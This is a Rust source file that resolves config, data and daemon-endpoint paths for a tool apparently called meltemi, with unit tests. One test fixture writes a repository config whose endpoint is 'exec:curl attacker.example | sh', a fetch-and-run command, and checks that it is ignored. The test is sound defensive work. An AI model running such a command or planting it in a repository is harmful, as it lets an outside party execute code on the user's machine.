// SPDX-License-Identifier: Apache-2.0

//! Platform path resolution (design D13): user data/config directories via
//! the `directories` crate, endpoint naming, and the project key used to
//! index per-project session logs.
//!
//! Every location honors a `MELTEMI_*` environment override so tests and
//! tooling can isolate themselves from the user's real daemon and data.

use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

/// Environment override for the daemon endpoint (socket path on Unix, pipe
/// name on Windows).
pub const ENV_ENDPOINT: &str = "MELTEMI_ENDPOINT";
/// Environment override for the user data directory (session logs, daemon
/// logs).
pub const ENV_DATA_DIR: &str = "MELTEMI_DATA_DIR";
/// Environment override for the user config directory.
pub const ENV_CONFIG_DIR: &str = "MELTEMI_CONFIG_DIR";

fn project_dirs() -> directories::ProjectDirs {
    directories::ProjectDirs::from("", "", "meltemi")
        .expect("no valid home directory for this user")
}

/// User data directory (session logs live under `projects/<key>/sessions/`,
/// daemon logs under `logs/`).
pub fn data_dir() -> PathBuf {
    if let Ok(dir) = std::env::var(ENV_DATA_DIR) {
        return PathBuf::from(dir);
    }
    project_dirs().data_dir().to_path_buf()
}

/// User config directory; the user-level config file is `config.toml` inside.
pub fn config_dir() -> PathBuf {
    if let Ok(dir) = std::env::var(ENV_CONFIG_DIR) {
        return PathBuf::from(dir);
    }
    project_dirs().config_dir().to_path_buf()
}

/// The daemon endpoint for the current user.
///
/// On Unix this is a socket path inside a `0700` directory; on Windows a
/// named pipe name that embeds the user SID so concurrent users never
/// collide.
pub fn endpoint() -> String {
    if let Ok(ep) = std::env::var(ENV_ENDPOINT) {
        return ep;
    }
    if let Some(ep) = configured_endpoint(&config_dir()) {
        return ep;
    }
    default_endpoint()
}

/// The endpoint this user configured, if any.
///
/// Read from the **user's** configuration directory and from nowhere else. A
/// repository's `.meltemi/config.toml` is never consulted for this, and that is
/// the one rule of this feature that admits no nuance: an endpoint can name a
/// command to run, so a repository able to set it would be a repository that
/// runs a command on your machine by the act of opening it. Cloning is an
/// ordinary thing to do and must not be a security decision
/// (via-ssh-del-cliente design D3).
///
/// This function takes the configuration directory and no project root, so
/// there is no path by which a project could reach it.
#[must_use]
pub fn configured_endpoint(config_dir: &std::path::Path) -> Option<String> {
    let raw = std::fs::read_to_string(config_dir.join("config.toml")).ok()?;
    // A `Table`, not a `Value`: parsing a whole document as `Value` compiles and
    // then quietly answers nothing, which cost this a failing test before it
    // cost anyone a silent misconfiguration.
    let parsed: toml::Table = raw.parse().ok()?;
    let endpoint = parsed
        .get("client")?
        .get("endpoint")?
        .as_str()?
        .trim()
        .to_string();
    (!endpoint.is_empty()).then_some(endpoint)
}

/// This user's own endpoint on this machine, whatever `MELTEMI_ENDPOINT` says:
/// the one place a client may start a daemon without being asked to
/// (acceso-remoto-afinado D1).
#[cfg(unix)]
pub fn default_endpoint() -> String {
    let base = std::env::var_os("XDG_RUNTIME_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(data_dir);
    base.join("meltemi")
        .join("meltemid.sock")
        .to_string_lossy()
        .into_owned()
}

/// This user's own endpoint on this machine, whatever `MELTEMI_ENDPOINT` says:
/// the one place a client may start a daemon without being asked to
/// (acceso-remoto-afinado D1).
#[cfg(windows)]
pub fn default_endpoint() -> String {
    format!(
        r"\\.\pipe\meltemid-{}",
        crate::transport::current_user_sid()
    )
}

/// Stable per-project key: hex-truncated SHA-256 of the canonical root path.
pub fn project_key(root: &Path) -> String {
    let canonical = root
        .canonicalize()
        .unwrap_or_else(|_| root.to_path_buf())
        .to_string_lossy()
        .into_owned();
    let digest = Sha256::digest(canonical.as_bytes());
    let mut key = String::with_capacity(16);
    for byte in &digest[..8] {
        key.push_str(&format!("{byte:02x}"));
    }
    key
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn project_key_is_stable_and_short() {
        let dir = std::env::temp_dir();
        let a = project_key(&dir);
        let b = project_key(&dir);
        assert_eq!(a, b);
        assert_eq!(a.len(), 16);
        assert!(a.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn distinct_paths_get_distinct_keys() {
        let a = project_key(Path::new("/does/not/exist/a"));
        let b = project_key(Path::new("/does/not/exist/b"));
        assert_ne!(a, b);
    }
}

#[cfg(test)]
mod endpoint_scope_tests {
    use super::*;

    fn temp_dir(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "meltemi-endpoint-scope-{}-{tag}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a temp directory");
        dir
    }

    // Scenario: Un repositorio no decide qué comando corre tu cliente
    #[test]
    fn the_endpoint_comes_from_the_user_and_a_repository_has_no_say() {
        let user = temp_dir("user");
        let project = temp_dir("project");
        std::fs::write(
            user.join("config.toml"),
            "[client]\nendpoint = \"exec:ssh my-pc meltemi bridge\"\n",
        )
        .expect("write the user file");
        // A repository that would very much like to decide.
        std::fs::create_dir_all(project.join(".meltemi")).expect("the project dir");
        std::fs::write(
            project.join(".meltemi").join("config.toml"),
            "[client]\nendpoint = \"exec:curl attacker.example | sh\"\n",
        )
        .expect("write the project file");

        assert_eq!(
            configured_endpoint(&user).as_deref(),
            Some("exec:ssh my-pc meltemi bridge"),
            "the user's own file decides"
        );
        // And the project's file is not a place this reads from. The signature
        // is the argument: it takes a configuration directory, so there is no
        // path by which a project root could reach it. Asked with the project
        // directory itself — the closest a caller could get to a mistake — it
        // finds nothing, because the file it looks for is not there.
        assert_eq!(
            configured_endpoint(&project),
            None,
            "a project root is not a configuration directory"
        );

        let _ = std::fs::remove_dir_all(&user);
        let _ = std::fs::remove_dir_all(&project);
    }

    #[test]
    fn a_missing_or_empty_setting_falls_through_instead_of_refusing() {
        let dir = temp_dir("absent");
        // No file at all.
        assert_eq!(configured_endpoint(&dir), None);
        // A file without the setting.
        std::fs::write(dir.join("config.toml"), "[other]\nthing = 1\n").expect("write");
        assert_eq!(configured_endpoint(&dir), None);
        // The setting, empty or blank: not an endpoint, and not an error either.
        for value in ["\"\"", "\"   \""] {
            std::fs::write(
                dir.join("config.toml"),
                format!("[client]\nendpoint = {value}\n"),
            )
            .expect("write");
            assert_eq!(configured_endpoint(&dir), None, "{value}");
        }
        // Unparseable TOML is not a reason to refuse to run: it falls through to
        // the machine's own endpoint, which is the behaviour of every client
        // before this setting existed.
        std::fs::write(dir.join("config.toml"), "[client\nendpoint =").expect("write");
        assert_eq!(configured_endpoint(&dir), None);

        let _ = std::fs::remove_dir_all(&dir);
    }
}
